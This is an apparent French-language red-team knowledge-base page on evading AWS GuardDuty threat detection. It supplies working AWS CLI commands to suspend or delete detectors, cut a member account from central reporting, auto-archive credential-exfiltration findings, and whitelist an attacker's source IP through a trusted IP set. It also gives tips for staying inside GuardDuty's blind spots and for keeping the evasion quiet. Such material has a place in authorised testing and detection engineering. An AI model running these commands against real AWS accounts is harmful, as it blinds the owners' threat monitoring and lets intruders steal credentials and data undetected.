---
title: "GuardDuty : désactiver les détecteurs et archiver les findings"
order: 2
description: "Désactiver les détecteurs, suspendre les findings et contourner les analyses GuardDuty pour échapper à la détection des menaces."
keywords:
  - GuardDuty
  - detector
  - findings
  - evasion
  - detection
---

# GuardDuty

GuardDuty note l'activité CloudTrail, VPC flow et DNS à la recherche de comportements connus comme malveillants. On le défait de deux façons : l'éteindre (bruyant, et lui-même un finding), ou rester dans ses angles morts pour qu'il ne se déclenche jamais.

## Désactiver ou supprimer le détecteur

```bash
aws guardduty list-detectors
aws guardduty update-detector --detector-id <id> --no-enable      # suspend analysis
aws guardduty delete-detector --detector-id <id>                  # remove entirely
# in a delegated-admin setup, cut a member loose from central reporting
aws guardduty disassociate-from-administrator-account --detector-id <id>
```

## Auto-archiver les findings que vous prévoyez de déclencher

```bash
# a filter with ARCHIVE silently files matching findings away from the console
aws guardduty create-filter --detector-id <id> --name quiet --action ARCHIVE \
  --finding-criteria '{"Criterion":{"type":{"Eq":["UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"]}}}'
```

## Mettre votre IP source en liste d'autorisation

GuardDuty supprime les findings qui proviennent d'un **trusted IP set**. En en téléversant un qui contient votre adresse source, vous retirez discrètement toute une catégorie de findings sans que le détecteur ne paraisse jamais désactivé :

```bash
# a trusted IP list (one CIDR per line in the S3 object) excludes those IPs from analysis
aws guardduty create-ip-set --detector-id <id> --name ops --format TXT \
  --location https://s3.amazonaws.com/<bucket>/trusted.txt --activate
```

## Rester dans les angles morts

- Appelez l'API depuis l'intérieur des régions attendues du compte et depuis un rôle EC2 plutôt que des clés externes, pour que les analyses d'exfiltration d'identifiants ne se déclenchent pas.
- Évitez Tor, les IP connues comme malveillantes et les motifs de pentest `GeneratedFindingFor` pour lesquels GuardDuty livre des règles d'exemple.
- Utilisez IMDSv2 et des rôles existants plutôt que des motifs qui correspondent à `InstanceCredentialExfiltration`.

## Notes d'exploitation

- Désactiver ou supprimer un détecteur est un événement de management que CloudTrail enregistre : associez-le donc au travail sur [CloudTrail](cloudtrail.md) ou attendez-vous à ce qu'il remonte.
- Les filtres sont plus discrets que la suppression : le service reste « activé » tandis que les findings que vous générez sont archivés hors de vue.
- GuardDuty est régional ; un détecteur existe par région, énumérez et traitez donc chaque région dans le périmètre.

## Outils

- **AWS CLI** (`guardduty`) : contrôle du détecteur et des filtres.
- **Pacu** (`detection__enum_services`, `detection__disruption`) : trouver et désactiver les services de détection.
- **Stratus Red Team** : détonation de suppression de détecteur GuardDuty.

## Références

- [HackTricks Cloud : contournement de GuardDuty](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [Stratus Red Team : supprimer un détecteur GuardDuty](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [AWS : types de findings GuardDuty](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html)
- [Datadog Security Labs : recherche sur le contournement de défense AWS](https://securitylabs.datadoghq.com/)
